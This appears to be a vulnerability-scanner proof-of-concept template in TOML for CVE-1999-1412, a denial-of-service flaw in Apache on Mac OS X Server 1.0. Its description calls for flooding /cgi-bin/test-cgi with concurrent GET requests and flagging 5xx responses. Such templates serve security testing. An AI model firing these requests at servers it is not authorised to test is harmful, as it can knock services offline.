[info]
author = "ave"
description = "验证 Apple Mac OS X Server 1.0 上运行的 Apache HTTP 服务器在遭受 CGI 接口高频 GET 请求洪流时是否出现拒绝服务（崩溃/资源耗尽）。通过向目标 CGI 路径并发发送大量请求，观察服务是否停止响应以确认漏洞存在。"
id = "POC-AVE-1999-1101"
name = "CVE-1999-1412 DoS PoC"
severity = "medium"
tags = ["ave-1999-1101"]
vuln_id = [
    "CVE-1999-1412",
    "AVE-1999-1101",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/cgi-bin/test-cgi"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
status = [
    500,
    502,
    503,
    504,
]
type = "status"
